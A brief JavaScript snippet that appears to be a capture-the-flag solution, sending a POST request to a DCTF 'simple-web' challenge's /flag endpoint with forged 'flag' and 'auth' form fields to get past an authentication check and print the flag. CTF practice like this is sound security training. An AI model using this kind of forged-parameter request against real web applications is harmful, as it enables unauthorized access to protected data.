const url = "http://dctf1-chall-simple-web.westeurope.azurecontainer.io:8080/flag"
fetch(url, {
    method: 'POST',
    body: new URLSearchParams({
        'flag': 1,
        'auth': 1,
        'Submit': 'Submit'
    })
}).then((x) => x.text()).then((x) => console.log(x));
